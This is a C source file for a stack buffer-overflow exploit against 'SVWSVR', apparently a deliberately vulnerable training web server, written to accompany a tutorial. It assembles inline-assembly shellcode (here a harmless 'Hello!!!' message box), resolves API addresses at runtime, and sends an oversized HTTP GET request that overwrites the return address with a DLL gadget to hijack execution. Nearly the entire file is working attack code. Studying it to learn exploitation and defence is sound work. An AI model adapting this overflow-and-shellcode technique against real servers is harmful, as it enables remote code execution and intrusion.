//SVWSVR Exploit by: ppcasm

/*
This file is to be used with SVWSVR and tutorial.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#include <windows.h>
#define BUFFER_SIZE 75

unsigned long resolve_func(const char *libraryz, const char *funcname, unsigned char *buf, unsigned long magic, unsigned long size);
int copy_payload(int max_bytes);

//First "payload" buffer to send to webserver to trigger overflow and stub some code in to load payload_final.
unsigned char payload_first[BUFFER_SIZE+1];

void payload(void)
{
    //This is the actual payload, written in inline asm.
    __asm__("xor %edx, %edx"); //Zero out edx for use as a 0 so as to not poision our buffer.
    __asm__("push %edx"); //push null string terminator.
    __asm__("push $0x2121216f"); //push "!!!o".
    __asm__("push $0x6c6c6548"); //push "lleH".
    __asm__("mov %esp, %ebx"); //Move string ptr to ebx.
    __asm__("push %edx"); //Type
    __asm__("push %ebx"); //Caption
    __asm__("push %ebx"); //Text
    __asm__("push %edx"); //hWnd
    __asm__("mov $0xdeadbeef, %eax"); //magic -> user32.dll:MessageboxA;
    __asm__("call *%eax"); //MessageBoxA();
    
    __asm__(".byte 0x41"); // F
    __asm__(".byte 0x41"); // i
    __asm__(".byte 0x41"); // l
    __asm__(".byte 0x41"); // l
    __asm__(".byte 0x41"); // e
    __asm__(".byte 0x41"); // r
    
    //Return lands here: calculate payload from stack offset and go to it.
    __asm__("mov $0x76851648, %eax");
    __asm__("call *%eax"); //Make call back to return insn. 
    __asm__("jmp *%edi");
    
    
    
//Footer: DO NOT TOUCH.
__asm__(".byte 0x00");
}

//Set HTTP GET request header.
char initbuf[] = "GET /";

//Set HTTP cmd "terminator".
char closer[]="\r\n\r\n";


//Return address overwrite.
unsigned char return_address[]="/xc9/xf7/x07/x02"; //"\xa1\x37\x0f\x77"; //Unaligned instruction in msvcrt.dll: call dword ptr ss:[esp+edi*2]

//This is used to finish off request.
char after_payload[]=
  " HTTP/1.1\r\n"
  "Host: 192.168.100.1\r\n"
  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\r\n"
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*.*;q=0.8\r\n"
  "Accept-Language: en-us;en;q=0.5\r\n"
  "Accept-Encoding: gzip, deflate\r\n"
  "Connection: keep-alive\r\n"
  "Cookie: EWSCookieId=old\r\n";

int main(int argc, char *argv[])
{
  if(argc!=3)
  { 
     printf("Wrong usage: %s <ip> <port>\n", argv[0]); 
     exit(0); 
  }
  
  int i = 0;
  
  //Copy payload machine code from payload() into buffer.
  if(copy_payload(sizeof(payload_first)) == -1)
  {
      exit(0);
  }

  //Resolve all func calls in payload to make for small shellcode.
  if(resolve_func("user32.dll", "MessageBoxA", &payload_first, 0xdeadbeef, sizeof(payload_first)) == -1)
  {
      printf("Error: resolve_func.\n");
      exit(0);
  }

  //Set up sockets and variables.
  SOCKET sock;
  WSADATA wsadata;
  WSAStartup(MAKEWORD(1, 1), &wsadata);
  
  struct sockaddr_in addr;
  int port;
  char *ip_addr;
  
  //Set ip address and port of webserver to connect to.
  port = atoi(argv[2]);
  ip_addr = argv[1];
  
  //Start socket.
  sock = socket(AF_INET, SOCK_STREAM, 0);
  
  //Define addresses.
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = inet_addr(ip_addr);
  
  //Connect to server.
  if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
  {
     printf("Connection failed.\n");
     closesocket(sock);
     WSACleanup();
     exit(0);
  }

  //Once connected, send GET request header.
  if(send(sock, initbuf, sizeof(initbuf)-1, 0) == -1)
  {
      printf("Send initbuf failed.\n");
      closesocket(sock);
      WSACleanup();
      exit(0);
  }
    
  //Send payload to streaming socket.
  if(send(sock, payload_first, sizeof(payload_first)-1, 0) == -1)
  {
       printf("Send payload failed.\n");
       closesocket(sock);
       WSACleanup();
       exit(0);
  }
  
  //Now, send return address.
  if(send(sock, return_address, sizeof(return_address)-1, 0) == -1)
  {
       printf("Send return_address failed.\n");
       closesocket(sock);
       WSACleanup();
       exit(0);
  }
    
  //Finish out the rest of the GET request information/possibly make payload bigger. 
  if(send(sock, after_payload, sizeof(after_payload)-1, 0) == -1)
  {
        printf("Send after-payload failed.\n");
        closesocket(sock);
        WSACleanup();
        exit(0);
   }
   
  //Send "closer" to terminate request.
  if(send(sock, closer, sizeof(closer)-1, 0) == -1)
  {
      printf("Send failed.\n");
      closesocket(sock);
      WSACleanup();
      exit(0);
   }
   
   printf("Exploit Sent!\n");
   closesocket(sock);
   WSACleanup();
  return 0;
}

int copy_payload(int max_bytes)
{
    //This will copy the machine code from the inline asm to the payload buffer and fill in trailing space.
    int i = 0;
    
    //Set the payloadz pointer to just after compiler generated function start, where raw insns start.
    unsigned char *payloadz = (unsigned char *)&payload+3;
    
    //First, get the actual size of the payload while copying.
    while(payloadz[i])
    {        
        payload_first[i]=payloadz[i];
        i++;
    }
    
    printf("Payload is %d bytes.\n", i);
    
    //Now, fill trailing buffer with "some value".
    while(i<=max_bytes)
    {
         payload_first[i]='A';
         i++;
    }
}

unsigned long resolve_func(const char *libraryz, const char *funcname, unsigned char *buf, unsigned long magic, unsigned long size)
{
  //Use this to resolve some calls in your payload for native machine.
  
  int i = 0;
  int base = 0;
  unsigned char a,b,c,d;
  a = (magic)&0xff;
  b = (magic)>>8&0xff;
  c = (magic)>>16&0xff;
  d = (magic)>>24&0xff;
 
  HMODULE libz = 0;
  unsigned long procaddz = 0;
  libz = LoadLibrary(libraryz);
  procaddz = GetProcAddress(libz, funcname);
  
  if(!procaddz)
  {
      return -1;
  }
  
  while(i<=size)
  {
     if(buf[i]==a&&buf[i+1]==b&&buf[i+2]==c&&buf[i+3]==d)
     {
          base = i;
     }
      
    i++;
  }
  
  if(!base)
  {
      printf("No reference to magic.\n");
      return -1;
  }
  
      buf[base+0] = (procaddz)&0xff;
      buf[base+1] = (procaddz>>8)&0xff;
      buf[base+2] = (procaddz>>16)&0xff;
      buf[base+3] = (procaddz>>24)&0xff;
  
  printf("Resolved (%x)-(Lib: %s) (Func: %s) (Addr: 0x%04x)\n",magic, libraryz, funcname, procaddz);
  return 0;
}

